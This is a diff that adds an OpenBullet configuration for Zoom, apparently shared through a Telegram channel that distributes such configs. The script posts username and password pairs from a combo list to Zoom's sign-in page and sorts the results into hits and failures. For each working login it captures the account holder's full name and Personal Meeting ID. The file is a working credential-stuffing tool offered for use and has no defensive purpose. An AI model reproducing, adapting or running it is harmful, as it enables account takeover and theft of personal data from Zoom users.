@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "Zoom.us",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-16T12:47:32.651021-06:00",
+  "AdditionalInfo": "{ backup telegram channels - @TeamOpenbullet , @TeamSilverbullet }",
+  "Author": "@OpenbulletConfigsOfficial / JOIN US ON TELEGRAM",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://zoom.us/signin" 
+  CONTENT "email=<USER>&password=<PASS>&keep_me_signin=true&type=100&captcha=null" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "status\":false" 
+  KEYCHAIN Success OR 
+    KEY "status\":true" 
+
+REQUEST GET "https://us04web.zoom.us/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "fullName: \"" "\"," CreateEmpty=FALSE -> CAP "Full Name" 
+
+PARSE "<SOURCE>" LR "myPMI: " "\"," CreateEmpty=FALSE -> CAP "Personal Meeting ID" 
+
+PARSE "<SOURCE>" LR "font-weight:400; display: none;\">" "</strong>" CreateEmpty=FALSE -> CAP "Personal Meeting ID" 
+
+FUNCTION Constant "t.me/OpenbulletConfigsOfficial    { backup telegram channels - @TeamOpenbullet , @TeamSilverbullet }" -> CAP "JOIN US ON TELEGRAM" 
+
